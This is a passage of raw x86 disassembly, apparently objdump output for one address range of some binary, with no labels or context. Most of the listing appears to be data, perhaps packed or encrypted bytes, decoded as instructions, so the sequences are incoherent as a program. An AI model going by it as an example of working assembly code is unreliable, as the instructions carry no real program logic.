  40502d:	add    BYTE PTR [eax+0x41],al
  405030:	add    eax,0x40436200
  405035:	inc    eax
  405036:	add    eax,0xe74aa362
  40503b:	adc    BYTE PTR [ecx],ch
  40503d:	push   edx
  40503e:	inc    esp
  40503f:	bound  eax,QWORD PTR ds:0x903447dd
  405045:	stos   BYTE PTR es:[edi],al
  405046:	int    0x46
  405048:	xchg   bl,bh
  40504a:	retf   
  40504b:	inc    ecx
  40504c:	syscall 
  40504e:	cwde   
  40504f:	clc    
  405050:	inc    eax
  405051:	cld    
  405052:	ds lock push ecx
  405055:	xchg   BYTE PTR ds:0x4962a230,dl
  40505b:	add    eax,0x41cb2470
  405060:	inc    eax
  405061:	add    eax,0x41624340
  405066:	test   BYTE PTR [eax],al
  405068:	and    eax,0x404043
  40506d:	add    BYTE PTR ds:0x626210,al
  405073:	add    eax,0x43404140
  405078:	inc    eax
  405079:	inc    ecx
  40507a:	add    eax,0x10664062
  40507f:	inc    ebx
  405080:	bound  ebx,QWORD PTR [ebp+0x5]
  405083:	push   cs
  405084:	jecxz  0x4050ae
  405086:	gs test eax,0xd086dd9c
  40508c:	jge    0x4050cf
  40508e:	push   0x40920d05
  405093:	ror    DWORD PTR [eax-0x30],1
  405096:	test   DWORD PTR [esi-0x295ed8b9],0x65687a2a
  4050a0:	mov    cl,0xdd
  4050a2:	add    eax,0x41cc05cd
  4050a7:	inc    eax
  4050a8:	add    BYTE PTR [eax],al
  4050aa:	add    BYTE PTR [eax+0x40],al
  4050ad:	inc    ebx
  4050ae:	bound  eax,QWORD PTR [eax]
  4050b0:	inc    eax
  4050b1:	inc    eax
  4050b2:	add    eax,0x62434162
  4050b7:	inc    eax
  4050b8:	js     0x4050ca
  4050ba:	inc    ecx
  4050bb:	add    eax,0x5404325
  4050c0:	bound  eax,QWORD PTR [eax+0x40]
  4050c3:	inc    ecx
  4050c4:	inc    ebx
  4050c5:	mov    edi,0x30a8ff7d
  4050ca:	arpl   WORD PTR [esi+0x51b4635e],ax
  4050d0:	add    eax,0x2040e060
  4050d5:	imul   esi,DWORD PTR [edi],0xffffff9f
  4050d8:	xchg   ah,al
  4050da:	and    BYTE PTR [eax+0x517d7141],ah
  4050e0:	jge    0x405131
  4050e2:	adc    eax,0x12322405
  4050e7:	lahf   
  4050e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050e9:	hlt    
  4050ea:	mov    cl,0x86
  4050ec:	and    eax,0x436241
  4050f1:	adc    BYTE PTR [eax+0x0],al
  4050f4:	add    eax,0x62410040
  4050f9:	inc    eax
  4050fa:	add    BYTE PTR [ebx-0x34],al
  4050fd:	inc    eax
  4050fe:	add    eax,0x78434040
  405103:	bound  eax,QWORD PTR [ecx+0x78]
  405106:	add    eax,0x62404043
  40510b:	add    BYTE PTR [edx+eiz*1+0x590505ef],dl
  405112:	inc    esi
  405113:	pushf  
  405114:	rcr    BYTE PTR [eax+0x51],0x86
  405118:	jnp    0x4050f8
  40511a:	inc    eax
  40511b:	(bad)  
  40511d:	rcr    BYTE PTR [edi+0x73159c2c],1
  405123:	nop
  405124:	bound  edx,QWORD PTR ds:0x2805a651
  40512a:	sbb    al,0x4c
  40512c:	or     al,0x32
  40512e:	lahf   
  40512f:	add    eax,0x96228cb
  405134:	xchg   ebx,eax
  405135:	int    0x8b
  405137:	xchg   BYTE PTR [edi+ecx*1+0x31e83aa9],bl
  40513e:	push   ecx
  40513f:	sub    al,0x15
  405141:	cmc    
  405142:	inc    ecx
  405143:	inc    eax
  405144:	add    eax,0x43436240
  405149:	add    eax,0x62004040
  40514e:	inc    eax
  40514f:	add    BYTE PTR [ecx+0x40],al
  405152:	inc    ebx
  405153:	test   BYTE PTR ds:0x58054041,ah
  405159:	inc    eax
  40515a:	inc    eax
  40515b:	bound  eax,QWORD PTR [eax+0x66]
  40515e:	inc    ecx
  40515f:	inc    eax
  405160:	add    eax,0x22349000
  405165:	inc    ecx
  405166:	ja     0x40510d
  405168:	leave  
  405169:	dec    esp
  40516a:	mov    edi,0x71d168d4
  40516f:	add    eax,0x62409441
  405174:	int3   
  405175:	inc    edx
  405176:	pop    esi
  405177:	xchg   BYTE PTR [ecx-0x1c],al
  40517a:	inc    ecx
  40517b:	outs   dx,DWORD PTR ds:[esi]
  40517c:	sti    
  40517d:	adc    DWORD PTR [ecx],edx
  40517f:	and    DWORD PTR [edx+edi*1],edx
  405182:	inc    ebx
  405183:	lods   al,BYTE PTR ds:[esi]
  405184:	jg     0x405202
  405186:	loope  0x40512c
  405188:	int    0xa8
  40518a:	add    BYTE PTR [eax],al
  40518c:	inc    ebx
  40518d:	inc    eax
  40518e:	bound  eax,QWORD PTR ds:0x25404110
  405194:	add    ah,cl
  405196:	inc    ebx
  405197:	add    eax,0x40402562
  40519c:	add    BYTE PTR [eax+0x40],al
  40519f:	inc    ecx
  4051a0:	inc    ecx
  4051a1:	add    eax,0x78434025
  4051a6:	bound  eax,QWORD PTR [eax-0x7c]
  4051a9:	inc    eax
  4051aa:	inc    ecx
  4051ab:	sub    BYTE PTR [eax-0x49],ch
  4051ae:	shl    DWORD PTR [ebp+eax*1+0x5683129c],1
  4051b5:	(bad)  
  4051b6:	bound  ebp,QWORD PTR [ecx-0x7a]
  4051b9:	or     eax,0x11a8c041
  4051be:	mov    ch,0x41
  4051c0:	dec    ecx
  4051c1:	retf   
  4051c2:	inc    esi
  4051c3:	xchg   ebp,eax
  4051c4:	adc    esi,esp
  4051c6:	jle    0x4051b8
  4051c8:	inc    eax
  4051c9:	inc    ecx
  4051ca:	adc    al,0x63
  4051cc:	mov    eax,0x40411362
  4051d1:	inc    eax
  4051d2:	inc    ebx
  4051d3:	int3   
  4051d4:	add    BYTE PTR ds:0x56240,al
  4051da:	inc    ebx
  4051db:	inc    eax
  4051dc:	inc    eax
  4051dd:	add    BYTE PTR [ecx+0x62],al
  4051e0:	bound  eax,QWORD PTR [eax]
  4051e2:	int3   
  4051e3:	inc    eax
  4051e4:	inc    ebx
  4051e5:	add    eax,0x43624041
  4051ea:	adc    BYTE PTR [ecx+0x5],al
  4051ed:	inc    eax
  4051ee:	mov    ebp,0xb4cd4043
  4051f3:	or     eax,0xdc674453
  4051f8:	dec    esp
  4051f9:	inc    ebp
  4051fa:	aas    
  4051fb:	int    0xca
  4051fd:	icebp  
  4051fe:	inc    eax
  4051ff:	mov    esp,0x445d41d0
  405204:	stc    
  405205:	aas    
  405206:	pusha  
  405207:	xchg   esp,ebp
  405209:	hlt    
  40520a:	bound  ecx,QWORD PTR [eax+0x62485a5a]
  405210:	inc    ebx
  405211:	inc    eax
  405212:	adc    BYTE PTR ds:0x4158cc40,al
  405218:	inc    ebx
  405219:	bound  eax,QWORD PTR [ecx+0x40]
  40521c:	add    eax,0x4140
  405221:	and    eax,0x40400062
  405226:	add    eax,0x84404340
  40522b:	int3   
  40522c:	js     0x40522e
  40522e:	inc    ecx
  40522f:	adc    BYTE PTR [edx+0xf],ah
  405232:	inc    edi
  405233:	jae    0x40521c
  405235:	retf   
  405236:	clc    
  405237:	pop    ds
  405238:	mov    cl,0x33
  40523a:	push   ss
  40523b:	test   al,0xa8
  40523d:	inc    esi
  40523e:	bound  edi,QWORD PTR [eax]
  405240:	rol    BYTE PTR [edx],cl
  405242:	ins    DWORD PTR es:[edi],dx
  405243:	adc    bl,BYTE PTR [edi]
  405245:	push   ecx
  405246:	dec    eax
  405247:	pop    ebp
  405248:	xor    DWORD PTR [ebx+0x43],esi
  40524b:	cwde   
  40524c:	out    0xca,al
  40524e:	xchg   ebp,eax
  40524f:	mov    al,0x1f
  405251:	inc    edx
  405252:	add    DWORD PTR ds:0x444962,edx
  405258:	inc    eax
  405259:	inc    ecx
  40525a:	inc    eax
  40525b:	inc    ebx
  40525c:	bound  ax,DWORD PTR ds:0x40434100
  405263:	add    eax,0x40054062
  405268:	bound  eax,QWORD PTR [ecx+0x40]
  40526b:	inc    ebx
  40526c:	inc    eax
  40526d:	add    eax,0x25405841
  405272:	bound  eax,QWORD PTR [eax+0x43]
  405275:	inc    eax
  405276:	adc    BYTE PTR [ecx-0x4d],ah
  405279:	repz xor ebx,ecx
  40527c:	mov    al,0x3c
  40527e:	int    0xf7
  405280:	add    al,0x72
  405282:	push   si
  405284:	retf   
  405285:	sar    BYTE PTR [eax+ebx*4-0x549f600e],0x40
  40528d:	inc    ecx
  40528e:	inc    ebx
  40528f:	inc    eax
  405290:	add    eax,0x43406262
  405295:	inc    ecx
  405296:	adc    BYTE PTR [eax],al
  405298:	inc    eax
  405299:	add    eax,0x43000562
  40529e:	add    BYTE PTR [ecx+0x40],al
  4052a1:	inc    eax
  4052a2:	add    eax,0x400062
  4052a7:	inc    ebx
  4052a8:	inc    eax
  4052a9:	js     0x4052ec
  4052ab:	inc    ecx
  4052ac:	bound  eax,QWORD PTR [eax+0x44]
  4052af:	retf   
  4052b0:	adc    eax,0xc9421420
  4052b5:	inc    esi
  4052b6:	cmc    
  4052b7:	mov    edi,0x92535643
  4052bc:	imul   eax,DWORD PTR [esi+0x496fbff3],0x37
  4052c3:	pop    edi
  4052c4:	sub    al,0x50
  4052c6:	arpl   sp,bx
  4052c8:	xor    al,0xb5
  4052ca:	inc    edx
  4052cb:	das    
  4052cc:	mov    ebx,0xdd9ef565
  4052d1:	ret    
  4052d2:	jno    0x405256
  4052d4:	ja     0x405316
  4052d6:	jae    0x405280
  4052d8:	dec    eax
  4052d9:	outs   dx,BYTE PTR ds:[esi]
  4052da:	and    DWORD PTR [edi+0x47],edx
  4052dd:	push   0x29
  4052df:	bound  eax,QWORD PTR [eax+0x5]
  4052e2:	inc    ecx
  4052e3:	add    BYTE PTR [ebx+0x40],al
  4052e6:	inc    eax
  4052e7:	inc    ecx
  4052e8:	inc    eax
  4052e9:	inc    eax
  4052ea:	bound  eax,QWORD PTR ds:0x5624300
  4052f0:	add    BYTE PTR [eax+0x40],al
  4052f3:	add    BYTE PTR [ecx+0x43],al
  4052f6:	add    BYTE PTR [eax+0x41],al
  4052f9:	add    eax,0x40436200
  4052fe:	inc    eax
  4052ff:	add    eax,0xf4e51262
  405304:	mov    bl,0xdd
  405306:	push   ss
  405307:	jne    0x4052a5
  405309:	inc    ebp
  40530a:	mov    ah,0x1
  40530c:	mov    bh,0xf1
  40530e:	push   0x62
  405310:	sub    BYTE PTR [ecx],cl
  405312:	or     eax,0x804d7b07
  405317:	popa   
  405318:	fisttp DWORD PTR [ecx+ecx*8+0x540412b]
  40531f:	inc    eax
  405320:	inc    ebx
  405321:	bound  eax,QWORD PTR [ecx-0x7c]
  405324:	add    BYTE PTR ds:0x404043,ah
  40532a:	add    BYTE PTR ds:0x626210,al
  405330:	add    eax,0x43404140
  405335:	inc    eax
  405336:	inc    ecx
  405337:	add    eax,0x10664062
  40533c:	inc    ebx
  40533d:	bound  esi,QWORD PTR [ecx+0x53886f90]
  405343:	bound  eax,QWORD PTR [ecx-0x59]
  405346:	push   es
  405347:	pusha  
  405348:	xchg   ecx,eax
  405349:	add    DWORD PTR [bp+si],ebp
  40534c:	adc    esi,0xf4122c71
  405352:	imul   edx,DWORD PTR [ecx],0x515d48c3
  405358:	les    eax,FWORD PTR ds:0x56b4ac57
  40535e:	sti    
  40535f:	inc    edi
  405360:	dec    edi
  405361:	add    eax,0x4041cc
  405366:	add    BYTE PTR [eax],al
  405368:	inc    eax
  405369:	inc    eax
  40536a:	inc    ebx
  40536b:	bound  eax,QWORD PTR [eax]
  40536d:	inc    eax
  40536e:	inc    eax
  40536f:	add    eax,0x62434162
  405374:	inc    eax
  405375:	js     0x405387
  405377:	inc    ecx
  405378:	add    eax,0x5404325
  40537d:	bound  eax,QWORD PTR [eax+0x40]
  405380:	inc    ecx
  405381:	inc    ebx
  405382:	leave  
  405383:	add    BYTE PTR [edx-0xe99a3f3],dl
  405389:	in     al,dx
  40538a:	xchg   ecx,eax
  40538b:	addr16 push edi
  40538d:	retf   
  40538e:	dec    esi
  40538f:	xchg   edi,eax
  405390:	loopne 0x405319
  405392:	mov    edi,0x94a062d0
  405397:	add    eax,0x2542483f
  40539c:	inc    ecx
  40539d:	bound  eax,QWORD PTR [ebx+0x0]
  4053a0:	adc    BYTE PTR [eax+0x0],al
  4053a3:	add    eax,0x62410040
  4053a8:	inc    eax
  4053a9:	add    BYTE PTR [ebx-0x34],al
  4053ac:	inc    eax
  4053ad:	add    eax,0x78434040
  4053b2:	bound  eax,QWORD PTR [ecx+0x78]
  4053b5:	add    eax,0x62404043
  4053ba:	xor    al,0x47
  4053bd:	mov    ds:0x8bc037b1,al
  4053c2:	push   edx
  4053c3:	cwde   
  4053c4:	pop    eax
  4053c5:	add    al,BYTE PTR [ebp+ecx*2+0x64]
  4053c9:	and    al,0x41
  4053cb:	arpl   ax,ax
  4053cd:	dec    ebx
  4053ce:	push   ecx
  4053cf:	test   esp,0xa0cd3c62
  4053d5:	adc    ebx,DWORD PTR [edx+0x4d]
  4053d8:	test   al,0xc8
  4053da:	js     0x405408
  4053dc:	add    eax,0x74ff51c5
  4053e1:	inc    esp
  4053e2:	add    ebp,edi
  4053e4:	retf   
  4053e5:	mov    dl,BYTE PTR [edi+0x4d]
  4053e8:	sub    bh,BYTE PTR ds:0xa34062a8
  4053ee:	inc    ecx
  4053ef:	inc    eax
  4053f0:	add    eax,0x43436240
  4053f5:	add    eax,0x62004040
  4053fa:	inc    eax
  4053fb:	add    BYTE PTR [ecx+0x40],al
  4053fe:	inc    ebx
  4053ff:	test   BYTE PTR ds:0x58054041,ah
  405405:	inc    eax
  405406:	inc    eax
  405407:	bound  eax,QWORD PTR [eax+0x66]
  40540a:	inc    ecx
  40540b:	inc    eax
  40540c:	add    eax,0x42ffd100
  405411:	mov    ss,WORD PTR [ecx]
  405413:	mov    al,0xff
  405415:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405416:	mov    edi,0xbca86971
  40541b:	bound  esp,QWORD PTR [edi-0x3b]
  40541e:	cmp    eax,0x414088f7
  405423:	in     eax,dx
  405424:	dec    esp
  405425:	fist   DWORD PTR [ecx+0x68405c4e]
  40542b:	dec    esp
  40542c:	test   al,0x40
  40542e:	inc    ecx
  40542f:	lahf   
  405430:	fld    DWORD PTR [ecx-0xc]
  405433:	xor    BYTE PTR [eax+0x60],al
  405436:	rcl    DWORD PTR [esi-0x23],cl
  405439:	inc    esp
  40543a:	arpl   WORD PTR [ecx+0x2a],ax
  40543d:	inc    eax
  40543e:	bound  edx,QWORD PTR [ebx+0x40430000]
  405444:	bound  eax,QWORD PTR ds:0x25404110
  40544a:	add    ah,cl
  40544c:	inc    ebx
  40544d:	add    eax,0x40402562
  405452:	add    BYTE PTR [eax+0x40],al
  405455:	inc    ecx
  405456:	inc    ecx
  405457:	add    eax,0x78434025
  40545c:	bound  eax,QWORD PTR [eax-0x7c]
  40545f:	inc    eax
  405460:	inc    ecx
  405461:	sub    ebp,DWORD PTR [eax]
  405463:	dec    edx
  405464:	test   al,0x40
  405466:	inc    eax
  405467:	xor    edx,DWORD PTR [edi+0x4]
  40546a:	adc    al,al
  40546c:	aas    
  40546d:	add    DWORD PTR [eax+0x14],eax
  405470:	adc    DWORD PTR [ebx-0x68],ebp
  405473:	fst    QWORD PTR [edx+0x10]
  405476:	push   eax
  405477:	mov    ch,0x40
  405479:	mov    esp,0x58624005
  40547e:	inc    eax
  40547f:	add    BYTE PTR [eax-0x7c],dl
  405482:	inc    edi
  405483:	dec    ebx
  405484:	jl     0x4054ae
  405486:	inc    eax
  405487:	cmc    
  405488:	mov    edi,0xf8fe4665
  40548d:	inc    esi
  40548e:	inc    eax
  40548f:	inc    edx
  405490:	jns    0x4054a3
  405492:	xor    BYTE PTR [edx],dl
  405494:	inc    ecx
  405495:	inc    eax
  405496:	inc    eax
  405497:	inc    ebx
  405498:	int3   
  405499:	add    BYTE PTR ds:0x56240,al
  40549f:	inc    ebx
  4054a0:	inc    eax
  4054a1:	inc    eax
  4054a2:	add    BYTE PTR [ecx+0x62],al
  4054a5:	bound  eax,QWORD PTR [eax]
  4054a7:	int3   
  4054a8:	inc    eax
  4054a9:	inc    ebx
  4054aa:	add    eax,0x43624041
  4054af:	adc    BYTE PTR [ecx+0x5],al
  4054b2:	inc    eax
  4054b3:	bound  esp,QWORD PTR [ebx-0x57a92fb0]
  4054b9:	(bad)  
  4054ba:	xor    BYTE PTR [edi],cl
  4054bc:	xor    al,0x40
  4054be:	and    DWORD PTR [ecx],edx
  4054c0:	adc    ah,al
  4054c2:	pop    ebx
  4054c3:	sub    BYTE PTR [eax+0x40],0x4f
  4054c7:	push   esi
  4054c8:	xor    eax,0xabd1234f
  4054cd:	inc    eax
  4054ce:	popf   
  4054cf:	fwait
  4054d0:	xor    ecx,edx
  4054d2:	xor    BYTE PTR [esp+ebp*8],ah
  4054d5:	adc    BYTE PTR [ebp+0x622b6224],bh
  4054db:	inc    ebx
  4054dc:	inc    eax
  4054dd:	adc    BYTE PTR ds:0x4158cc40,al
  4054e3:	inc    ebx
  4054e4:	bound  eax,QWORD PTR [ecx+0x40]
  4054e7:	add    eax,0x4140
  4054ec:	and    eax,0x40400062
  4054f1:	add    eax,0x84404340
  4054f6:	int3   
  4054f7:	js     0x4054f9
  4054f9:	inc    ecx
  4054fa:	adc    BYTE PTR [edx+0xf],ah
  4054fd:	arpl   ax,bx
  4054ff:	inc    BYTE PTR [eax+0x4f]
  405502:	xor    DWORD PTR [edi-0x68],ebp
  405505:	inc    ecx
  405506:	bound  eax,QWORD PTR [edi-0x23a560c0]
  40550c:	add    eax,0x40c52a3c
  405511:	jge    0x405513
  405513:	inc    eax
  405514:	inc    ecx
  405515:	inc    eax
  405516:	inc    ebx
  405517:	bound  ax,DWORD PTR ds:0x40434100
  40551e:	add    eax,0x40054062
  405523:	bound  eax,QWORD PTR [ecx+0x40]
  405526:	inc    ebx
  405527:	inc    eax
  405528:	add    eax,0x25405841
  40552d:	bound  eax,QWORD PTR [eax+0x43]
  405530:	inc    eax
  405531:	adc    al,dl
  405533:	lods   eax,DWORD PTR ds:[esi]
  405534:	leave  
  405535:	dec    ebx
  405536:	ins    BYTE PTR es:[edi],dx
  405537:	test   DWORD PTR [eax],edx
  405539:	mov    bl,0x2c
  40553b:	cmp    edi,DWORD PTR [edi+0x40306360]
  405541:	lds    esp,FWORD PTR [ebx]
  405543:	jge    0x405504
  405545:	pop    ss
  405546:	jp     0x4054f8
  405548:	inc    eax
  405549:	inc    ecx
  40554a:	inc    ebx
  40554b:	inc    eax
  40554c:	add    eax,0x43406262
  405551:	inc    ecx
  405552:	adc    BYTE PTR [eax],al
  405554:	inc    eax
  405555:	add    eax,0x43000562
  40555a:	add    BYTE PTR [ecx+0x40],al
  40555d:	inc    eax
  40555e:	add    eax,0x400062
  405563:	inc    ebx
  405564:	inc    eax
  405565:	js     0x4055a8
  405567:	inc    ecx
  405568:	bound  eax,QWORD PTR [eax+0x40]
  40556b:	push   ebp
  40556c:	repnz arpl WORD PTR [eax],bp
  40556f:	shr    BYTE PTR [eax+0x7a5f4162],1
  405575:	mov    edi,0xc44068d9
  40557a:	rcl    BYTE PTR [edx+0x62a8743a],1
  405580:	inc    eax
  405581:	add    eax,0x40430041
  405586:	inc    eax
  405587:	inc    ecx
  405588:	inc    eax
  405589:	inc    eax
  40558a:	bound  eax,QWORD PTR ds:0x5624300
  405590:	add    BYTE PTR [eax+0x40],al
  405593:	add    BYTE PTR [ecx+0x43],al
  405596:	add    BYTE PTR [eax+0x41],al
  405599:	add    eax,0x40436200
  40559e:	inc    eax
  40559f:	add    eax,0x4f2af962
  4055a4:	inc    eax
  4055a5:	and    eax,DWORD PTR [eax]
  4055a7:	bound  edx,QWORD PTR [edx+0x4040bf30]
  4055ad:	ret    
  4055ae:	xor    DWORD PTR [edi+edi*4+0x41],eax
  4055b2:	sub    dh,BYTE PTR [eax+0x5343f640]
  4055b8:	inc    edi
  4055b9:	fmul   DWORD PTR [eax+0x3d]
  4055bc:	inc    eax
  4055bd:	sub    al,0xd0
  4055bf:	xor    DWORD PTR [ecx],edx
  4055c1:	jecxz  0x4055ed
  4055c3:	ret    
  4055c4:	inc    eax
  4055c5:	sbb    eax,0x40418e29
  4055ca:	add    eax,0x41624340
  4055cf:	test   BYTE PTR [eax],al
  4055d1:	and    eax,0x404043
  4055d6:	add    BYTE PTR ds:0x626210,al
  4055dc:	add    eax,0x43404140
  4055e1:	inc    eax
  4055e2:	inc    ecx
  4055e3:	add    eax,0x10664062
  4055e8:	inc    ebx
  4055e9:	bound  edi,QWORD PTR [ecx+eiz*8+0x53d1b02b]
  4055f0:	clc    
  4055f1:	std    
  4055f2:	bound  edx,QWORD PTR [ebx]
  4055f4:	ss add eax,0xa8b1b540
  4055fa:	jle    0x4055d6
  4055fc:	inc    ebp
  4055fd:	leave  
  4055fe:	inc    eax
  4055ff:	push   edi
  405600:	and    al,0x10
  405602:	sub    BYTE PTR [eax-0x6abfb3b8],bh
  405608:	jge    0x40564b
  40560a:	pop    ecx
  40560b:	outs   dx,BYTE PTR ds:[esi]
  40560c:	xlat   BYTE PTR ds:[ebx]
  40560d:	inc    edi
  40560e:	aas    
  40560f:	pop    ebx
  405610:	push   esp
  405611:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405612:	add    eax,0x4041cc
  405617:	add    BYTE PTR [eax],al
  405619:	inc    eax
  40561a:	inc    eax
  40561b:	inc    ebx
  40561c:	bound  eax,QWORD PTR [eax]
  40561e:	inc    eax
  40561f:	inc    eax
  405620:	add    eax,0x62434162
  405625:	inc    eax
  405626:	js     0x405638
  405628:	inc    ecx
  405629:	add    eax,0x5404325
  40562e:	bound  eax,QWORD PTR [eax+0x40]
  405631:	inc    ecx
  405632:	inc    ebx
  405633:	mov    dh,0x81
  405635:	xor    al,0x3e
  405637:	inc    eax
  405638:	xchg   ebx,eax
  405639:	fild   QWORD PTR [eax-0x58]
  40563c:	fsub   QWORD PTR [edx-0x2c]
  40563f:	inc    eax
  405640:	imul   ecx,DWORD PTR [esi+0x62],0x41
  405644:	nop
  405645:	clc    
  405646:	jl     0x405688
  405648:	cmc    
  405649:	xor    al,0x35
  40564b:	sub    ch,BYTE PTR [eax+0x423ca8c3]
  405651:	imul   esi,eax,0x1140a940
  405657:	inc    eax
  405658:	rcr    DWORD PTR [esi+0x402b4011],cl
  40565e:	dec    eax
  40565f:	inc    eax
  405660:	inc    ebx
  405661:	imul   esp,DWORD PTR [edx+0x42],0x400d075b
  405668:	jno    0x40568f
  40566a:	inc    ecx
  40566b:	bound  eax,QWORD PTR [ebx+0x0]
  40566e:	adc    BYTE PTR [eax+0x0],al
  405671:	add    eax,0x62410040
  405676:	inc    eax
  405677:	add    BYTE PTR [ebx-0x34],al
  40567a:	inc    eax
  40567b:	add    eax,0x78434040
  405680:	bound  eax,QWORD PTR [ecx+0x78]
  405683:	add    eax,0x62404043
  405688:	mov    bl,0x3e
  40568a:	test   edi,0x402e42fe
  405690:	int    0xac
  405692:	inc    esi
  405693:	cmp    eax,0x124073a8
  405698:	push   ebp
  405699:	arpl   WORD PTR [edx+0x4],ax
  40569c:	inc    esp
  40569d:	xor    BYTE PTR [eax+0x9],al
  4056a0:	jmp    0x405667
  4056a2:	sub    al,0xdc
  4056a4:	aam    0x54
  4056a6:	inc    eax
  4056a7:	inc    esp
  4056a8:	repnz cwde 
  4056aa:	inc    esp
  4056ab:	push   eax
  4056ac:	test   BYTE PTR [eax],ch
  4056ae:	add    al,0xd0
  4056b0:	push   0x60df4265
  4056b5:	repz inc eax
  4056b7:	mov    ebp,0x892d504d
  4056bc:	inc    ecx
  4056bd:	inc    eax
  4056be:	add    eax,0x43436240
  4056c3:	add    eax,0x62004040
  4056c8:	inc    eax
  4056c9:	add    BYTE PTR [ecx+0x40],al
  4056cc:	inc    ebx
  4056cd:	test   BYTE PTR ds:0x58054041,ah
  4056d3:	inc    eax
  4056d4:	inc    eax
  4056d5:	bound  eax,QWORD PTR [eax+0x66]
  4056d8:	inc    ecx
  4056d9:	inc    eax
  4056da:	add    eax,0x40aa7900
  4056df:	maxps  xmm1,XMMWORD PTR ds:0x62dd4abc
  4056e6:	inc    eax
  4056e7:	inc    edx
  4056e8:	dec    ebp
  4056e9:	retf   
  4056ea:	sbb    BYTE PTR [edx+edi*2],cl
  4056ed:	out    0x40,eax
  4056ef:	rcr    BYTE PTR [edi+0x4f],1
  4056f2:	jno    0x40575f
  4056f4:	add    BYTE PTR [eax],al
  4056f6:	inc    ebx
  4056f7:	inc    eax
  4056f8:	bound  eax,QWORD PTR ds:0x25404110
  4056fe:	add    ah,cl
  405700:	inc    ebx
  405701:	add    eax,0x40402562
  405706:	add    BYTE PTR [eax+0x40],al
  405709:	inc    ecx
  40570a:	inc    ecx
  40570b:	add    eax,0x78434025
  405710:	bound  eax,QWORD PTR [eax-0x7c]
  405713:	inc    eax
  405714:	inc    ecx
  405715:	and    BYTE PTR [eax+0x414042d7],bl
  40571b:	sar    BYTE PTR [ebp+0x7],cl
  40571e:	dec    esi
  40571f:	mov    ds:0x622953df,al
  405724:	gs in  al,dx
  405726:	mov    edi,fs
  405728:	jae    0x405780
  40572a:	cmp    al,0x44
  40572c:	xor    eax,0x42355c6f
  405731:	pop    edi
  405732:	inc    ecx
  405733:	inc    eax
  405734:	inc    eax
  405735:	inc    ebx
  405736:	int3   
  405737:	add    BYTE PTR ds:0x56240,al
  40573d:	inc    ebx
  40573e:	inc    eax
  40573f:	inc    eax
  405740:	add    BYTE PTR [ecx+0x62],al
  405743:	bound  eax,QWORD PTR [eax]
  405745:	int3   
  405746:	inc    eax
  405747:	inc    ebx
  405748:	add    eax,0x43624041
  40574d:	adc    BYTE PTR [ecx+0x5],al
  405750:	inc    eax
  405751:	or     edi,DWORD PTR [eax]
  405753:	arpl   WORD PTR [edi+0x2c],ax
  405756:	sub    eax,0x8bccafd4
  40575b:	xor    eax,0x28e6830
  405760:	jecxz  0x405704
  405762:	sub    ecx,DWORD PTR [eax+0x6c]
  405765:	or     al,BYTE PTR [ecx+0x3da83b40]
  40576b:	std    
  40576c:	and    al,0xa9
  40576e:	bound  eax,QWORD PTR [ebx+0x40]
  405771:	adc    BYTE PTR ds:0x4158cc40,al
  405777:	inc    ebx
  405778:	bound  eax,QWORD PTR [ecx+0x40]
  40577b:	add    eax,0x4140
  405780:	and    eax,0x40400062
  405785:	add    eax,0x84404340
  40578a:	int3   
  40578b:	js     0x40578d
  40578d:	inc    ecx
  40578e:	adc    BYTE PTR [edx+0xf],ah
  405791:	ja     0x405723
  405793:	and    dl,BYTE PTR [eax]
  405795:	push   esp
  405796:	push   0x0
  405798:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405799:	push   edx
  40579a:	pop    ss
  40579b:	std    
  40579c:	inc    esp
  40579d:	push   edx
  40579e:	pop    ebx
  40579f:	dec    ecx
  4057a0:	not    esp
  4057a2:	sub    al,BYTE PTR [ebx+0x4a]
  4057a5:	add    BYTE PTR [eax+0x41],al
  4057a8:	inc    eax
  4057a9:	inc    ebx
  4057aa:	bound  ax,DWORD PTR ds:0x40434100
  4057b1:	add    eax,0x40054062
  4057b6:	bound  eax,QWORD PTR [ecx+0x40]
  4057b9:	inc    ebx
  4057ba:	inc    eax
  4057bb:	add    eax,0x25405841
  4057c0:	bound  eax,QWORD PTR [eax+0x43]
  4057c3:	inc    eax
  4057c4:	adc    BYTE PTR ds:0x64af2adc,ch
  4057ca:	inc    ecx
  4057cb:	mov    edi,0x2686af04
  4057d0:	arpl   WORD PTR [edx],bp
  4057d2:	lock and ecx,ebx
  4057d5:	mov    esp,0x96540fdc
  4057da:	adc    bl,BYTE PTR [edi-0x4c]
  4057dd:	gs inc ecx
  4057df:	xchg   ebp,eax
  4057e0:	neg    ecx
  4057e2:	cs jp  0x4057fa
  4057e5:	cs pop eax
  4057e7:	arpl   WORD PTR [ebp+0x4341406f],bp
  4057ed:	inc    eax
  4057ee:	add    eax,0x43406262
  4057f3:	inc    ecx
  4057f4:	adc    BYTE PTR [eax],al
  4057f6:	inc    eax
  4057f7:	add    eax,0x43000562
  4057fc:	add    BYTE PTR [ecx+0x40],al
  4057ff:	inc    eax
  405800:	add    eax,0x400062
  405805:	inc    ebx
  405806:	inc    eax
  405807:	js     0x40584a
  405809:	inc    ecx
  40580a:	bound  eax,QWORD PTR [eax-0x50]
  40580d:	aas    
  40580e:	retf   
  40580f:	retf   
  405810:	xor    al,0x41
  405812:	(bad)
  405817:	dec    ecx
  405818:	cmp    al,0x77
  40581a:	outs   dx,BYTE PTR ds:[esi]
  40581b:	sub    eax,DWORD PTR [edx+0x7f]
  40581e:	mov    eax,ds:0x3ce964e5
  405823:	aas    
  405824:	jo     0x40585c
  405826:	sub    DWORD PTR [ecx+0x62],0x410540
  40582d:	inc    ebx
  40582e:	inc    eax
  40582f:	inc    eax
  405830:	inc    ecx
  405831:	inc    eax
  405832:	inc    eax
  405833:	bound  eax,QWORD PTR ds:0x5624300
  405839:	add    BYTE PTR [eax+0x40],al
  40583c:	add    BYTE PTR [ecx+0x43],al
  40583f:	add    BYTE PTR [eax+0x41],al
  405842:	add    eax,0x40436200
  405847:	inc    eax
  405848:	add    eax,0x4c629762
  40584d:	imul   eax,DWORD PTR [edx+0x7f],0xbf90e44a
  405854:	dec    ebx
  405855:	push   0x6244237f
  40585a:	push   ebx
  40585b:	or     eax,0x3f726fc1
  405860:	int3   
  405861:	adc    al,0xba
  405863:	int    0x52
  405865:	loope  0x4058a9
  405867:	mov    edi,0x61a0e010
  40586c:	dec    ebx
  40586d:	inc    ecx
  40586e:	inc    eax
  40586f:	add    eax,0x41624340
  405874:	test   BYTE PTR [eax],al
  405876:	and    eax,0x404043
